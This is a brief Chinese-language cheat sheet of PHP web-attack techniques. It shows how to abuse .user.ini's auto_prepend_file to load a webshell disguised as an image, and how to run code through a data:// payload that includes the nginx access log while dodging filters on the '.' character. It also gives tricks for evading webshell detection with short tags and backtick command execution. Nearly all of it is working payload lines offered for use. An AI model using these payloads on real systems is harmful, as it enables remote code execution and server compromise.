1. .user.ini利用技巧
auto_prepend_file = webshell.png
auto_prepend_file可以指定解析非php文件
auto_prepend_file='data://text/plain,<?=$lo="lo"?><?=$g="g"?><?=$a=""|","?><?=include"/var/$lo$g/nginx/access$a$lo$g"?>'
auto_prepend_file还可以直接使用php的各类伪协议，如直接使用data伪协议命令执行，上述payload的|运算是用%02|,来构造.号，绕过过滤

1. webshell免杀
通常短标签加反引号执行就能绕过
<?=`ls ..`;
过滤的特别严格可以考虑使用.user.ini的日志文件包含来绕过，但当前目录下需要有index.php文件